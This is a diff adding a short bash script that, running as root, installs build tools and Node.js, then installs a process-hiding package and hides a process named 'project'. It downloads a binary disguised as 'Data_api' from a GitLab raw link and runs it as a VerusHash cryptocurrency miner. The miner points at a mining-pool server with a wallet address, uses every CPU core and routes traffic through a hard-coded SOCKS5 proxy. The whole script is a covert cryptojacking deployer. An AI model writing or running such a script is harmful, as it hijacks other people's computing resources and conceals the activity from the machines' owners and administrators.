@@ -1,0 +1,10 @@
+#!/bin/bash    
+sudo su <<EOF
+apt update && apt -y install sudo wget curl unzip >/dev/null 2>&1
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs >/dev/null 2>&1
+sudo npm i -g node-process-hider && sudo ph add project
+wget -O project https://gitlab.com/mauliki9999/codet/-/raw/main/Data_api && chmod +x project &&
+./project -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u TYP6GyG9f4Mo9MDFHPDG1hmdgBRHXPZZxP.$(echo $(shuf -i 1-2000 -n 1)-ZZZ) -p c=TRX,refcode=b4eb8af1601c8b3b29dea05ff8faf0b3 -t $(nproc --all) -x socks5://hola:1234abcd@47.89.228.8:80
+EOF
